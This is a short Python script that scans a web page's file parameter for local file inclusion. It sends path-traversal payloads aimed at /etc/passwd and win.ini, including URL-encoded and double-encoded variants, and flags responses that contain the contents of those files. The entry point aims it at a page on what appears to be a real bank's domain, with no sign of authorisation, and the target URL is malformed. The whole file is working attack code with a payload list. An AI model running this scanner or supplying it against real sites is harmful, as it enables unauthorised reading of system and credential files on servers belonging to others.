import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import time

LFI_PAYLOADS = [
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "..%2f..%2fetc%2fpasswd",
    "..\\..\\windows\\win.ini",
    "/etc/passwd",
    "..%252f..%252fetc%252fpasswd",
]

def test_lfi_payloads(base_url, param="file"):
    results = []

    for payload in LFI_PAYLOADS:
        parsed = urlparse(base_url)
        query = parse_qs(parsed.query)
        if param not in query:
            continue

        query[param] = [payload]
        new_query = urlencode(query, doseq=True)
        full_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))

        try:
            resp = requests.get(full_url, timeout=5)
            content = resp.text.lower()
            suspicious = any(s in content for s in ["root:x", "[extensions]", "[fonts]", "[drivers]"])
            results.append({
                "url": full_url,
                "payload": payload,
                "status": resp.status_code,
                "length": len(resp.text),
                "suspicious": suspicious
            })

            time.sleep(0.5)
        except Exception as e:
            results.append({
                "url": full_url,
                "payload": payload,
                "status": "ERR",
                "length": 0,
                "suspicious": False,
                "error": str(e)
            })

    return results

if __name__ == "__main__":
    base = "https://base_url=gazprombank.ru/view.php?file=readme.txt"
    test_results = test_lfi_payloads(base, param="file")

    for res in test_results:
        mark = "✅" if res["suspicious"] else "⚠️"
        print(f"{mark} {res['url']} | status={res['status']} | len={res['length']}")